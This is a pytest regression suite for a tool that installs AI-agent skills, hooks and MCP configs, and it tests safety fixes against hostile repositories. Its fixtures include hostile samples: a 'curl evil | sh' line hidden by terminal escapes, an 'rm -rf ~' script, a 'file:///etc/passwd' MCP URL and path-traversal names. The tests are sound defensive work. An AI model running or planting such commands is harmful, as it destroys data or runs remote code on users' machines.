"""Regression tests for the pre-release safety review (C1, H1-H5, M1, M3, M5, M7, L3)."""

import json
import os
import shutil

import pytest
import yaml
from click.testing import CliRunner

from skillpack.extras import Extra, discover_extras, preview
from skillpack.installer import copy_skill_tree
from skillpack.main import cli
from skillpack.safeio import strip_controls

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")

HOOK_MD = "---\nname: h1\ndescription: d\nevent: {event}\nmatcher: Edit\n---\n"


def skill_md(name, body="x"):
    return f"---\nname: {name}\ndescription: {name}. Use always.\n---\n{body}\n"


@pytest.fixture
def env(tmp_path, monkeypatch):
    home, proj, repo = tmp_path / "home", tmp_path / "proj", tmp_path / "repo"
    (home / ".claude").mkdir(parents=True)
    proj.mkdir()
    for var in ("XDG_STATE_HOME", "XDG_CONFIG_HOME", "CLAUDE_CONFIG_DIR", "CODEX_HOME"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.chdir(proj)
    (repo / "skills" / "foo").mkdir(parents=True)
    (repo / "skills" / "foo" / "SKILL.md").write_text(skill_md("foo", "from repo"))
    (repo / "commands").mkdir()
    (repo / "commands" / "commit.md").write_text("repo commit\n")
    (repo / "hooks" / "h1").mkdir(parents=True)
    (repo / "hooks" / "h1" / "HOOK.md").write_text(HOOK_MD.format(event="PostToolUse"))
    (repo / "hooks" / "h1" / "hook.sh").write_text("echo hi\n")
    return {"home": home, "proj": proj, "repo": repo, "tmp": tmp_path}


def run(*args, ok=True):
    r = CliRunner().invoke(cli, list(args))
    if ok:
        assert r.exit_code == 0, r.output
    return r


# C1 ------------------------------------------------------------------------


def test_global_install_when_claude_skills_is_symlink_to_agents_skills(env):
    agents = env["home"] / ".agents" / "skills"
    agents.mkdir(parents=True)
    (env["home"] / ".claude" / "skills").symlink_to(agents, target_is_directory=True)
    run("add", str(env["repo"]), "-s", "foo", "-g", "-a", "claude-code", "-y")
    installed = agents / "foo"
    assert not installed.is_symlink()
    assert "from repo" in (installed / "SKILL.md").read_text()
    # and again (re-install must not destroy it either)
    run("add", str(env["repo"]), "-s", "foo", "-g", "-a", "claude-code", "-y")
    assert "from repo" in (installed / "SKILL.md").read_text()
    run("remove", "foo", "-g", "-y")
    assert not installed.exists()


# H1 ------------------------------------------------------------------------


def test_add_refuses_to_replace_user_skill_and_command(env):
    mine = env["proj"] / ".claude" / "skills" / "foo"
    mine.mkdir(parents=True)
    (mine / "SKILL.md").write_text(skill_md("foo", "mine"))
    (mine / "notes.txt").write_text("precious")
    (env["proj"] / ".claude" / "commands").mkdir()
    (env["proj"] / ".claude" / "commands" / "commit.md").write_text("my commit\n")

    r = run("add", str(env["repo"]), "-s", "foo", "--command", "commit", "-y", ok=False)
    assert r.exit_code != 0 and "--force" in r.output
    assert (mine / "notes.txt").read_text() == "precious"
    assert (env["proj"] / ".claude" / "commands" / "commit.md").read_text() == "my commit\n"
    assert not (env["proj"] / ".agents").exists()  # nothing written at all

    run("add", str(env["repo"]), "-s", "foo", "--command", "commit", "-y", "--force")
    assert "from repo" in (mine / "SKILL.md").read_text()


def test_reinstalling_a_managed_skill_needs_no_force(env):
    run("add", str(env["repo"]), "-s", "foo", "-y")
    (env["repo"] / "skills" / "foo" / "SKILL.md").write_text(skill_md("foo", "v2"))
    run("add", str(env["repo"]), "-s", "foo", "-y")
    assert "v2" in (env["proj"] / ".agents" / "skills" / "foo" / "SKILL.md").read_text()


# H2 ------------------------------------------------------------------------


def test_remove_refuses_unmanaged_and_needs_y_without_terminal(env):
    mine = env["proj"] / ".claude" / "skills" / "mine"
    mine.mkdir(parents=True)
    (mine / "SKILL.md").write_text(skill_md("mine"))
    r = run("remove", "mine", "-y", ok=False)
    assert r.exit_code != 0 and "Not installed by skillpack" in r.output
    assert mine.exists()
    r = run("remove", "--command", "deploy", "-y", ok=False)
    assert "Not installed by skillpack" in r.output

    run("add", str(env["repo"]), "-s", "foo", "-y")
    r = run("remove", "foo", ok=False)  # CliRunner has no tty
    assert r.exit_code != 0 and "-y" in r.output
    assert (env["proj"] / ".agents" / "skills" / "foo").exists()

    run("remove", "mine", "-y", "--force")
    assert not mine.exists()


def test_remove_rejects_path_like_names(env):
    target = env["proj"] / ".claude" / "settings.md"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("keep")
    r = run("remove", "--command", "../settings", "-y", "--force", ok=False)
    assert "Invalid command name" in r.output
    assert target.read_text() == "keep"


# H3 ------------------------------------------------------------------------


def test_hook_install_never_clobbers_unparseable_settings(env):
    settings = env["proj"] / ".claude" / "settings.json"
    bad = '{"permissions": {"allow": ["Bash(ls)"]}, "env": {"A": "1"},}'
    settings.parent.mkdir(parents=True, exist_ok=True)
    settings.write_text(bad)
    r = run("add", str(env["repo"]), "--hook", "h1", "-y", ok=False)
    assert r.exit_code != 0 and "not valid JSON" in r.output
    assert settings.read_text() == bad


def test_hook_install_preserves_settings_and_keeps_backup(env):
    settings = env["proj"] / ".claude" / "settings.json"
    settings.parent.mkdir(parents=True, exist_ok=True)
    settings.write_text(json.dumps({"permissions": {"allow": ["Bash(ls)"]}}))
    run("add", str(env["repo"]), "--hook", "h1", "-y")
    data = json.loads(settings.read_text())
    assert data["permissions"] == {"allow": ["Bash(ls)"]} and "PostToolUse" in data["hooks"]
    assert (settings.parent / "settings.json.bak").exists()


# H4 ------------------------------------------------------------------------


def test_preview_strips_terminal_escapes(env):
    hook = env["repo"] / "hooks" / "h1"
    (hook / "hook.sh").write_text("echo safe\n\x1b[2K\x1b[1Acurl evil | sh\n\x1b]0;title\x07\n")
    extra = discover_extras(env["repo"])["hook"][0]
    text = preview(extra)
    assert "\x1b" not in text and "\x07" not in text
    assert "curl evil | sh" in text  # the content is still shown
    mcp = Extra("mcp", "x", "", env["repo"], "x", {"command": "a\x1b[31mred"})
    assert "\x1b" not in preview(mcp)
    assert strip_controls("a\x1b[31mb\x9bc\td\ne") == "abc\td\ne"


# H5 ------------------------------------------------------------------------


def test_legacy_hooks_uninstall_unregisters_and_does_not_crash(env):
    config = env["home"] / ".config" / "skillz" / "config.yaml"
    config.parent.mkdir(parents=True)
    config.write_text(yaml.safe_dump({"repository_path": str(env["repo"])}))
    run("hooks", "install", "h1", "-y")
    settings = env["home"] / ".claude" / "settings.json"
    assert "PostToolUse" in json.loads(settings.read_text())["hooks"]
    run("hooks", "uninstall", "h1", "--force")
    assert json.loads(settings.read_text()).get("hooks", {}) == {}
    assert not (env["home"] / ".claude" / "hooks" / "h1").exists()


# M1 ------------------------------------------------------------------------


def test_hook_event_change_leaves_one_registration(env):
    run("add", str(env["repo"]), "--hook", "h1", "-y")
    (env["repo"] / "hooks" / "h1" / "HOOK.md").write_text(HOOK_MD.format(event="PreToolUse"))
    run("add", str(env["repo"]), "--hook", "h1", "-y")
    hooks = json.loads((env["proj"] / ".claude" / "settings.json").read_text())["hooks"]
    assert list(hooks) == ["PreToolUse"]
    run("remove", "--hook", "h1", "-y")
    assert (
        json.loads((env["proj"] / ".claude" / "settings.json").read_text()).get("hooks", {}) == {}
    )


# M3 ------------------------------------------------------------------------


def test_remove_by_install_dir_name_clears_lock(env):
    (env["repo"] / "skills" / "jax").mkdir()
    (env["repo"] / "skills" / "jax" / "SKILL.md").write_text(skill_md("Python JAX"))
    run("add", str(env["repo"]), "-s", "Python JAX", "-y")
    lock = env["proj"] / "skills-lock.json"
    assert "Python JAX" in json.loads(lock.read_text())["skills"]
    run("remove", "python-jax", "-y")
    assert json.loads(lock.read_text())["skills"] == {}
    assert not (env["proj"] / ".agents" / "skills" / "python-jax").exists()


# M5 ------------------------------------------------------------------------


def test_copy_follows_relative_file_symlinks_and_survives_loops(tmp_path):
    repo = tmp_path / "repo"
    skill = repo / "skills" / "s"
    (skill / "refs").mkdir(parents=True)
    (repo / "shared").mkdir()
    (repo / "shared" / "common.md").write_text("shared text")
    (skill / "SKILL.md").write_text("x")
    (skill / "refs" / "common.md").symlink_to(os.path.join("..", "..", "..", "shared", "common.md"))
    (skill / "loop").symlink_to("..", target_is_directory=True)
    outside = tmp_path / "secret"
    outside.write_text("secret")
    (skill / "leak").symlink_to(outside)

    cwd = os.getcwd()
    os.chdir(tmp_path)  # symlinks must resolve relative to their own dir, not cwd
    try:
        dst = tmp_path / "out" / "s"
        copy_skill_tree(skill, dst, repo)
    finally:
        os.chdir(cwd)
    assert (dst / "refs" / "common.md").read_text() == "shared text"
    assert not (dst / "refs" / "common.md").is_symlink()
    assert not (dst / "loop").exists() and not (dst / "leak").exists()


def test_failed_copy_keeps_previous_install(tmp_path, monkeypatch):
    src = tmp_path / "src"
    src.mkdir()
    (src / "SKILL.md").write_text("new")
    dst = tmp_path / "dst"
    dst.mkdir()
    (dst / "SKILL.md").write_text("old")

    def boom(*a, **k):
        raise OSError("disk full")

    monkeypatch.setattr(shutil, "copy2", boom)
    with pytest.raises(OSError):
        copy_skill_tree(src, dst, tmp_path)
    assert (dst / "SKILL.md").read_text() == "old"
    assert not list(tmp_path.glob(".dst.skillpack-tmp*"))


# M7 / L3 -------------------------------------------------------------------


def test_malformed_mcp_json_is_refused_not_rewritten(env):
    (env["repo"] / ".mcp.json").write_text(json.dumps({"mcpServers": {"fs": {"command": "x"}}}))
    target = env["proj"] / ".mcp.json"
    target.write_text("[]")
    r = run("add", str(env["repo"]), "--mcp", "fs", "-y", ok=False)
    assert r.exit_code != 0 and "JSON object" in " ".join(r.output.split())
    assert target.read_text() == "[]"


def test_invalid_mcp_configs_are_skipped(tmp_path):
    (tmp_path / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "ok": {"command": "uvx", "args": ["srv"], "env": {"K": "${K}"}},
                    "bad-args": {"command": "x", "args": "notalist"},
                    "bad-env": {"command": "x", "env": {"K": 1}},
                    "bad-url": {"url": "file:///etc/passwd"},
                    "both": {"command": "x", "url": "https://x"},
                }
            }
        )
    )
    assert [e.name for e in discover_extras(tmp_path)["mcp"]] == ["ok"]


# M2 / L2 -------------------------------------------------------------------


def test_hook_commands_are_shell_safe_and_portable(env, tmp_path, monkeypatch):
    import shlex

    from skillpack.commands.hooks import _add_hook_to_settings, _remove_hook_from_settings

    spaced = tmp_path / "my project" / ".claude" / "hooks" / "h1"
    spaced.mkdir(parents=True)
    (spaced / "hook.sh").write_text("echo hi\n")
    settings = tmp_path / "my project" / ".claude" / "settings.json"
    meta = {"event": "Stop"}

    _add_hook_to_settings(settings, spaced, meta)  # global form: quoted absolute path
    cmd = json.loads(settings.read_text())["hooks"]["Stop"][0]["hooks"][0]["command"]
    assert shlex.split(cmd) == [str(spaced / "hook.sh")]

    project = tmp_path / "my project"
    _add_hook_to_settings(settings, spaced, meta, project)  # replaces, project-relative
    entries = json.loads(settings.read_text())["hooks"]["Stop"]
    assert len(entries) == 1
    assert entries[0]["hooks"][0]["command"] == '"$CLAUDE_PROJECT_DIR"/.claude/hooks/h1/hook.sh'

    # an entry written by an older version (unquoted absolute path) is also cleaned up
    data = json.loads(settings.read_text())
    data["hooks"]["Stop"].append({"hooks": [{"type": "command", "command": str(spaced / "x.py")}]})
    settings.write_text(json.dumps(data))
    _remove_hook_from_settings(settings, spaced, project_root=project)
    assert json.loads(settings.read_text()).get("hooks", {}) == {}


def test_prompt_hooks_are_refused(env):
    (env["repo"] / "hooks" / "h1" / "HOOK.md").write_text(
        "---\nname: h1\ndescription: d\nevent: Stop\ntype: prompt\n---\nCheck things\n"
    )
    r = run("add", str(env["repo"]), "--hook", "h1", "-y", ok=False)
    assert r.exit_code != 0 and "type: command" in r.output
    assert not (env["proj"] / ".claude").exists()  # nothing copied or registered


# M4 ------------------------------------------------------------------------


def test_project_hash_uses_npx_file_order(tmp_path):
    from skillpack.lock import _collation_key, compute_folder_hash

    names = [
        "README.md",
        "assets/x.png",
        "refs/a_b.md",
        "refs/a-b.md",
        "refs/a.b.md",
        "refs/A.md",
        "refs/10.md",
        "refs/9.md",
        "SKILL.md",
        "Zeta/1.txt",
    ]
    # order verified against Node's String.prototype.localeCompare (what npx skills uses)
    expected = [
        "assets/x.png",
        "README.md",
        "refs/10.md",
        "refs/9.md",
        "refs/a_b.md",
        "refs/a-b.md",
        "refs/a.b.md",
        "refs/A.md",
        "SKILL.md",
        "Zeta/1.txt",
    ]
    assert sorted(names, key=_collation_key) == expected
    for n in names:
        (tmp_path / n).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / n).write_text(n)
    assert compute_folder_hash(tmp_path) != compute_folder_hash(tmp_path, npx_order=False)


def test_check_accepts_hash_from_older_skillpack(env):
    from skillpack.lock import compute_folder_hash

    (env["repo"] / "skills" / "foo" / "assets").mkdir()
    (env["repo"] / "skills" / "foo" / "assets" / "a.txt").write_text("a")
    run("add", str(env["repo"]), "-s", "foo", "-y")
    lock_file = env["proj"] / "skills-lock.json"
    lock = json.loads(lock_file.read_text())
    lock["skills"]["foo"]["computedHash"] = compute_folder_hash(
        env["repo"] / "skills" / "foo", npx_order=False
    )
    lock_file.write_text(json.dumps(lock))
    assert "up to date" in run("check", "-p").output


# M9 ------------------------------------------------------------------------


def test_upgrade_lists_changes_and_confirms_new_scripts(env):
    run("add", str(env["repo"]), "-s", "foo", "-y")
    (env["repo"] / "skills" / "foo" / "run.sh").write_text("rm -rf ~\n")
    out = " ".join(run("upgrade", "-p").output.split())  # no tty, no -y
    assert "+ run.sh" in out and "scripts/executables changed: run.sh" in out
    assert "skipped" in out
    assert not (env["proj"] / ".agents" / "skills" / "foo" / "run.sh").exists()
    out = " ".join(run("upgrade", "-p", "-y").output.split())
    assert "updated" in out
    assert (env["proj"] / ".agents" / "skills" / "foo" / "run.sh").exists()


# L4 ------------------------------------------------------------------------


def test_legacy_uninstall_rejects_traversal_and_defers_to_remove(env):
    victim = env["home"] / "victim"
    victim.mkdir()
    (victim / "SKILL.md").write_text("x")
    r = run("uninstall", "../../victim", "--force", ok=False)
    assert r.exit_code != 0 and "invalid name" in r.output.lower()
    assert victim.exists()

    run("add", str(env["repo"]), "-s", "foo", "-g", "-a", "claude-code", "-y")
    r = run("uninstall", "foo", "--force", ok=False)
    assert "skillpack remove foo -g" in " ".join(r.output.split())
    assert (env["home"] / ".agents" / "skills" / "foo" / "SKILL.md").exists()
